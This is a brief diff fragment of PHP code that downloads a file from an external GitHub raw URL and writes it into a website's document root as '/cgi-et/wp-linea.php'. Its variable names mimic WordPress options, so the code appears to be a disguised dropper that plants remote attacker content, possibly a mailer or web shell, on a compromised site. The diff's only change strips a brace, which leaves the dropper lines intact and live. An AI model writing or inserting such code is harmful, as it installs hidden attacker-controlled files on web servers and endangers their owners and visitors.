@@ -21,7 +21,7 @@ if (file_put_contents ($wpoptionss31, $sec31));
 
 $wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/mail.txt');
 $wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-linea.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); }
+if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); 
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
